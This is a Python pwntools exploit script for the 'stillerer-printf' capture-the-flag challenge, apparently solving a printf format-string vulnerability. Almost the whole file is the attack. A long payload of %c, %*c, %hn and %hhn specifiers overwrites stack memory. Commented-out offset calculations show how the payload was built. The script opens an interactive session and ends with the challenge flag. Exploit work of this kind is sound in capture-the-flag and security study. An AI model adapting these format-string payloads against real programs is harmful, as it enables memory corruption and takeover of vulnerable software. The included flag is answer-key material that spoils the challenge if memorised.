from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./vuln_patched', '''
    brva 0x12f4
    continue
''')

# p = process('./run.py')
# p = remote('stillerer-printf.chal.imaginaryctf.org', 1337)

# 0x1c0
# 0x220 -> 0x320
# 0x2a8 -> 0x2d8

p.sendline(str(0x1c0+4).encode())

# payload = b'%c'*(0x1c0//8+6-1-1)+f"%{((0x7ffd0485bd68-0x320)-0x00007ffd0485bc70)%0x10000-(0x1c0//8+6-1-1)-((0x220//8+6)-(0x1c0//8+6)-1-1)}c".encode()+b'%*c'+b'%c'*((0x220//8+6)-(0x1c0//8+6)-1-1)+b'%hn'
# payload += b'%c'*((0x2a8//8+6)-(0x220//8+6)-1-1)+f"%{-((0x1c0//8+6-1-1)+((0x7ffd0485bd68-0x320)-0x00007ffd0485bc70)%0x10000-(0x1c0//8+6-1-1)-((0x220//8+6)-(0x1c0//8+6)-1-1)+((0x220//8+6)-(0x1c0//8+6)-1-1)+((0x2a8//8+6)-(0x220//8+6)-1-1))%0x100}c".encode()+b'%hhn'
# payload += f"%*{(0x2d8//8+6)}$c".encode()*15
# payload += b'%9c'+f'%{(0x320//8+6)}$hhn'.encode()

payload = b'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%64914c%*c%c%c%c%c%c%c%c%c%c%c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn%*97$c%*97$c%*97$c%*97$c%*97$c%*97$c%*97$c%*97$c%*97$c%*97$c%*97$c%*97$c%*97$c%*97$c%*97$c%137c%106$hhn'

p.sendline(payload)

p.interactive()

# https://hazyclimb.dev/posts/stiller-printf/
# https://eth007.me/blog/ctf/stiller-printf/
# ictf{never_can_get_still_enough_bf1d441aa309}